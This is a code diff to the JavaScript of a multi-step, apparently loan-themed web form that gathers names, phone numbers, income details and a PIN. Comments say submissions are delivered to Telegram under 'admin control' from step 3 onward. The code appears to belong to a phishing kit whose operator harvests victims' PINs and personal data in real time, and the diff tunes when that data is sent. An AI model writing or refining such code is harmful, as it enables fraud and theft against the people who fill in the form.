@@ -49,27 +49,19 @@ function pollAdminResponse() {
         });
 }
 
+// Step 1: Local transition only (No server request / No Telegram notification)
 function submitStep1(e) {
     e.preventDefault();
-    const data = {
-        fullName: document.getElementById('fullName').value,
-        phone: document.getElementById('phone').value
-    };
     goToScreen('screen-step2');
-    postData('step1', data);
 }
 
+// Step 2: Local transition only (No server request / No Telegram notification)
 function submitStep2(e) {
     e.preventDefault();
-    const data = {
-        reason: document.getElementById('reason').value,
-        monthlyIncome: document.getElementById('monthlyIncome').value,
-        requestedAmount: document.getElementById('requestedAmount').value
-    };
     goToScreen('screen-step3');
-    postData('step2', data);
 }
 
+// Step 3: Starts Telegram delivery and admin control here!
 function submitStep3(e) {
     e.preventDefault();
     const data = {
@@ -98,4 +90,5 @@ function submitStep5(e) {
     let pin = '';
     inputs.forEach(i => pin += i.value);
     postData('step5', { pin });
-}
+                    }
+    
